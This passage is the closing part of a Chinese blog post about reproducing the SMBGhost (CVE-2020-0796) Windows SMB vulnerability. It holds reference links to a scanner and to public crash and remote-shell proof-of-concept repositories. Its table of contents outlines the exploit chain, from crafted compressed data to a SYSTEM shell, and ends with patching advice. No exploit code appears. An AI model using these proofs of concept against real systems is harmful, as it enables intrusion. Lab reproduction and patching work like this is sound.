+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference  "></a>Reference </center> </center></h2><p>[1]漏洞检测工具： <a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
+<p>[2]蓝屏攻击poc：<a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
+<p>[3]shell监听脚本：<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<p>[4]关于SMBGhost的原理分析 ：<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796</a></p>
+<p>[5]关于复现的技术：CVE-2020-0796永恒之黑漏洞浅谈与利用-阿里云开发者社区 (aliyun.com)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://thorin215-wang.com">Thorin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://thorin215-wang.com/2023/02/23/Security/">http://thorin215-wang.com/2023/02/23/Security/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/david.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="../../../07/03/Math-Soft/" title="The Note of Math-Soft"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">The Note of Math-Soft</div></div></a></div><div class="next-post pull-right"><a href="../../21/reminsce%20of%20my%20high%20school/" title="朝花夕拾--高中往事"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">朝花夕拾--高中往事</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/david.jpg" onerror="this.onerror=null;this.src='../img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Thorin</div><div class="author-info__description">Keep Going</div></div><div class="card-info-data site-data is-center"><a href="../archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="../tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Thorin215"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91-CVE-2020-0796-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%A0%94%E7%A9%B6"><span class="toc-number">1.</span> <span class="toc-text">永恒之黑(CVE-2020-0796)漏洞复现及研究 </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMBGhost"><span class="toc-number">2.</span> <span class="toc-text">SMBGhost</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Thorin"><span class="toc-number">2.1.</span> <span class="toc-text"> Thorin  </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.2.</span> <span class="toc-text">1.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">1.2 受影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-SMBGhost%E5%8E%9F%E7%90%86%E5%8F%8A%E7%89%B9%E6%80%A7"><span class="toc-number">2.4.</span> <span class="toc-text">1.3  SMBGhost原理及特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.5.</span> <span class="toc-text">2.1 环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%9C%BA%E7%9A%84IP%E5%9C%B0%E5%9D%80"><span class="toc-number">2.6.</span> <span class="toc-text">2.2 获取靶机以及攻击机的IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%89%8D%E6%9C%9F%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E6%80%A7"><span class="toc-number">2.7.</span> <span class="toc-text">2.3 前期验证漏洞存在性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E8%93%9D%E5%B1%8F%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.8.</span> <span class="toc-text">2.4 蓝屏攻击复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E8%BF%9C%E7%A8%8B%E7%9B%91%E5%90%AC%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.9.</span> <span class="toc-text">2.5 远程监听复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">2.10.</span> <span class="toc-text">3.1 漏洞分析及复现脚本分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-%E5%AF%B9%E8%93%9D%E5%B1%8F%E6%94%BB%E5%87%BB%E6%97%B6%E7%9A%84%E5%86%85%E5%AD%98%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%A0%88%E5%9B%9E%E6%BA%AF%EF%BC%9A"><span class="toc-number">2.10.1.</span> <span class="toc-text">3.1.1 对蓝屏攻击时的内存转储文件分析并进行栈回溯：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.10.2.</span> <span class="toc-text">3.2.1 远程控制攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89-%E9%AA%8C%E8%AF%81%E7%A8%8B%E5%BA%8F%E9%A6%96%E5%85%88%E5%88%9B%E5%BB%BA%E5%88%B0SMS-server%E7%9A%84%E4%BC%9A%E8%AF%9D%E8%BF%9E%E6%8E%A5%EF%BC%88%E8%AE%B0%E4%B8%BAsession%EF%BC%89%E3%80%82"><span class="toc-number">2.10.2.1.</span> <span class="toc-text">（1） 验证程序首先创建到SMS server的会话连接（记为session）。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%AA%8C%E8%AF%81%E7%A8%8B%E5%BA%8F%E8%8E%B7%E5%8F%96%E8%87%AA%E8%BA%ABtoken%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%ADprivilege%E6%88%90%E5%91%98%E5%9C%A8%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%88%E8%AE%B0tokenAddr%EF%BC%89%E3%80%82"><span class="toc-number">2.10.2.2.</span> <span class="toc-text">（2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E9%AA%8C%E8%AF%81%E7%A8%8B%E5%BA%8F%E9%80%9A%E8%BF%87session%E5%8F%91%E9%80%81%E7%95%B8%E5%BD%A2%E5%8E%8B%E7%BC%A9%E6%95%B0%E6%8D%AE%EF%BC%88%E8%AE%B0%E4%B8%BAevilData%EF%BC%89%E7%BB%99SMB-server%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E%E3%80%82%E5%85%B6%E4%B8%AD%EF%BC%8CevilData%E5%8C%85%E5%90%ABtokenAddr%E3%80%81%E6%9D%83%E9%99%90%E6%95%B0%E6%8D%AE%E3%80%81%E6%BA%A2%E5%87%BA%E5%8D%A0%E4%BD%8D%E6%95%B0%E6%8D%AE%E3%80%82"><span class="toc-number">2.10.2.3.</span> <span class="toc-text">（3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89-SMS-server%E6%94%B6%E5%88%B0evilData%E5%90%8E%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%B9%B6%E4%BF%AE%E6%94%B9tokenAddr%E5%9C%B0%E5%9D%80%E5%A4%84%E7%9A%84%E6%9D%83%E9%99%90%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%8F%90%E5%8D%87%E9%AA%8C%E8%AF%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9D%83%E9%99%90%E3%80%82"><span class="toc-number">2.10.2.4.</span> <span class="toc-text">（4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E9%AA%8C%E8%AF%81%E7%A8%8B%E5%BA%8F%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%E5%90%8E%E5%AF%B9winlogon%E8%BF%9B%E8%A1%8C%E6%8E%A7%E5%88%B6%EF%BC%8C%E6%9D%A5%E5%88%9B%E5%BB%BAsystem%E7%94%A8%E6%88%B7shell%E3%80%82"><span class="toc-number">2.10.2.5.</span> <span class="toc-text">（5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-%E8%93%9D%E5%B1%8F%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.10.3.</span> <span class="toc-text">3.1.2 蓝屏攻击原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.11.</span> <span class="toc-text">4.1 修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-1-%E5%AE%89%E8%A3%85%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81"><span class="toc-number">2.11.0.1.</span> <span class="toc-text">4.1.1.安装官方补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-2-%E7%A6%81%E7%94%A8SMBv3%E5%8E%8B%E7%BC%A9"><span class="toc-number">2.11.0.2.</span> <span class="toc-text">4.1.2.禁用SMBv3压缩</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-3-%E8%AE%BE%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5%E5%85%B3%E9%97%AD%E7%9B%B8%E5%85%B3%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.11.0.3.</span> <span class="toc-text">4.1.3.设置防火墙策略关闭相关端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-4-%E9%80%9A%E8%BF%87IP%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E5%B1%8F%E8%94%BD%E5%8D%B1%E9%99%A9%E7%AB%AF%E5%8F%A3%EF%BC%8Cbat%E6%89%A7%E8%A1%8C%E6%B7%BB%E5%8A%A0%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5%EF%BC%8C%E5%85%B3%E9%97%AD%E5%8D%B1%E9%99%A9%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.11.0.4.</span> <span class="toc-text">4.1.4.通过IP安全策略屏蔽危险端口，bat执行添加防火墙策略，关闭危险服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.12.</span> <span class="toc-text">Reference  </span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2023/07/03/Math-Soft/" title="The Note of Math-Soft">The Note of Math-Soft</a><time datetime="2023-07-03T13:22:00.000Z" title="Created 2023-07-03 21:22:00">2023-07-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2023/02/23/Security/" title="漏洞复现">漏洞复现</a><time datetime="2023-02-23T11:38:44.000Z" title="Created 2023-02-23 19:38:44">2023-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2023/02/21/reminsce%20of%20my%20high%20school/" title="朝花夕拾--高中往事">朝花夕拾--高中往事</a><time datetime="2023-02-21T02:47:02.000Z" title="Created 2023-02-21 10:47:02">2023-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2023/02/20/note%20of%20myblog/" title="The beginning of Thorin's blog">The beginning of Thorin's blog</a><time datetime="2023-02-20T08:15:52.000Z" title="Created 2023-02-20 16:15:52">2023-02-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2023/02/03/hello-world/" title="Hello World">Hello World</a><time datetime="2023-02-03T13:38:08.378Z" title="Created 2023-02-03 21:38:08">2023-02-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Thorin</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="../../../../js/utils.js"></script><script src="../../../../js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
